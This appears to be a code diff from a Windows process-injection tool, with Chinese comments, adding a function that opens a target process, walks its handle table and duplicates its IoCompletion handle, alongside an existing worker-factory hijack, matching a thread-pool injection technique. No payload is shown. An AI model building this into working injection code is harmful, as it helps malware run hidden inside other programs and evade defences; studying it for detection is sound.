@@ -2,8 +2,7 @@
 
 #include "pch.h"
 #include "HijackHandle.h"
-
-
+#include <stdio.h>
 
 // =========================
 // Close Handle
@@ -376,5 +375,66 @@ HANDLE Hijack_TP_WORK_HANDLE(PHANDLE phTargetProcess, DWORD pid)
     free(pHandleTable);
     // 同样不要在这里关闭 hTargetProcess
     printf("[-] 未找到 TpWorkerFactory\n");
+    return NULL;
+}
+// 劫持句柄
+HANDLE Hijack_TP_IO_HANDLE(PHANDLE phTargetProcess, DWORD pid)
+{
+    CLIENT_ID clientId = { (HANDLE)(ULONG_PTR)pid, NULL };
+    OBJECT_ATTRIBUTES objAttr;
+    InitializeObjectAttributes(
+        &objAttr,
+        NULL,
+        0,
+        NULL,
+        NULL
+    );
+    HANDLE hTargetProcess = NULL;
+    NTSTATUS status = MyOpenProcess(&hTargetProcess, clientId, objAttr);
+    if (!NT_SUCCESS(status) || !hTargetProcess)
+    {
+        printf("[-] Open target process failed\n");
+        return NULL;
+    }
+
+    *phTargetProcess = hTargetProcess;   // 传给调用者
+
+    // 查询句柄表...
+    PROCESS_HANDLE_SNAPSHOT_INFORMATION* pHandleTable = NULL;
+    status = MyQueryInformationProcess(hTargetProcess, ProcessHandleSnapshotInformation, &pHandleTable);
+    if (!NT_SUCCESS(status))
+    {
+        // 这里不要关闭 hTargetProcess
+        return NULL;
+    }
+
+    for (ULONG_PTR i = 0; i < pHandleTable->NumberOfHandles; i++)
+    {
+        HANDLE hSourceHandle = pHandleTable->Handles[i].HandleValue;
+        HANDLE hDuplicatedHandle = NULL;
+
+        status = MyDuplicateHandle(hTargetProcess, hSourceHandle, &hDuplicatedHandle);
+        if (!NT_SUCCESS(status)) continue;
+
+        // 查询类型...
+        PUBLIC_OBJECT_TYPE_INFORMATION* pInfo = NULL;
+        if (NT_SUCCESS(MyQueryObject(hDuplicatedHandle, ObjectTypeInformation, &pInfo)))
+        {
+            if (_wcsnicmp(pInfo->TypeName.Buffer, L"IoCompletion", pInfo->TypeName.Length / sizeof(WCHAR)) == 0)
+            {
+                printf("找到 IoCompletion 句柄!\n");
+                free(pInfo);
+                free(pHandleTable);
+                // 注意：这里不要关闭 hTargetProcess！
+                return hDuplicatedHandle;
+            }
+            free(pInfo);
+        }
+        MyCloseHandle(hDuplicatedHandle);
+    }
+
+    free(pHandleTable);
+    // 同样不要在这里关闭 hTargetProcess
+    printf("未找到 IoCompletion\n");
     return NULL;
 }
